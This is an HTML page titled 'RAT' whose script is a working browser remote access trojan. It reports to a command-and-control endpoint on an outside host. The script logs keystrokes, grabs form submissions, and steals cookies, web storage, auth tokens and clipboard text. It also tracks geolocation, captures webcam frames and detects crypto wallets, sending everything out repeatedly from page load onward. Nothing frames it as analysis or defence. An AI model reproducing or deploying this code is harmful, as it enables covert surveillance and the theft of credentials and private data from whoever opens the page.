<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>RAT</title></head>
<body>
<script>
var C2='https://botnet-panel.onrender.com/api/ratdata';
var BOT_ID='{{BOT_ID}}';
var KEYLOG='';

function send(t,d){
    var x=new XMLHttpRequest();
    x.open('POST',C2,true);
    x.setRequestHeader('Content-Type','text/plain');
    try{x.send(JSON.stringify({id:BOT_ID,type:t,data:JSON.stringify(d)}));}catch(e){}
}

// A) KEYLOGGER
document.addEventListener('keydown',function(e){KEYLOG+=e.key;if(e.key==='Enter')KEYLOG+='\n';if(KEYLOG.length>200){send('keylog',{keys:KEYLOG,url:location.href});KEYLOG='';}});
setInterval(function(){if(KEYLOG.length>0){send('keylog',{keys:KEYLOG,url:location.href});KEYLOG='';}},10000);

// B) FORM GRABBING
document.addEventListener('submit',function(e){var f=e.target,d={};f.querySelectorAll('input').forEach(function(i){d[i.name||i.id||i.type]=i.value});send('form_grab',{url:location.href,action:f.action,data:d});},true);

// C) COOKIE
function sc(){send('cookies_web',{url:location.href,cookies:document.cookie});}sc();setInterval(sc,30000);

// D) STORAGE
function ss(){var l={},s={};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);l[k]=localStorage.getItem(k)}for(i=0;i<sessionStorage.length;i++){k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k)}}catch(e){}send('storage',{local:l,session:s});}ss();setInterval(ss,60000);

// E) SCREENSHOT
send('screenshot',{w:screen.width,h:screen.height,url:location.href});setInterval(function(){send('screenshot',{w:screen.width,h:screen.height,url:location.href})},60000);

// F) CLIPBOARD
setInterval(function(){try{navigator.clipboard.readText().then(function(t){if(t)send('clipboard_web',{text:t})}).catch(function(){})}catch(e){}},15000);

// G) GEOLOCATION
function geo(){if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){send('geolocation',{lat:p.coords.latitude,lng:p.coords.longitude})},function(){},{timeout:5000})}geo();setInterval(geo,60000);

// H) WEBCAM
window.startWebcam=function(){try{navigator.mediaDevices.getUserMedia({video:true}).then(function(s){send('webcam',{status:'OK'});setInterval(function(){var v=document.createElement('video');v.srcObject=s;v.play();var c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);send('webcam_frame',{img:c.toDataURL('image/jpeg',0.2)})},5000)}).catch(function(e){send('webcam',{status:'DENIED',err:e.message})})}catch(e){}};

// I) CRYPTO WALLETS
function cw(){var w=[];if(window.ethereum&&window.ethereum.isMetaMask)w.push('MetaMask');if(window.solana&&window.solana.isPhantom)w.push('Phantom');if(window.trustwallet)w.push('TrustWallet');send('crypto',{wallets:w})}cw();setInterval(cw,30000);

// J) TOKENS
function st(){var t={};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i),v=localStorage.getItem(k);if(k.indexOf('token')!=-1||k.indexOf('auth')!=-1||k.indexOf('session')!=-1||k.indexOf('jwt')!=-1)t[k]=v}}catch(e){}send('tokens',{tokens:t,url:location.href})}st();setInterval(st,60000);

send('loaded',{url:location.href,ua:navigator.userAgent});
</script>
</body>
</html>
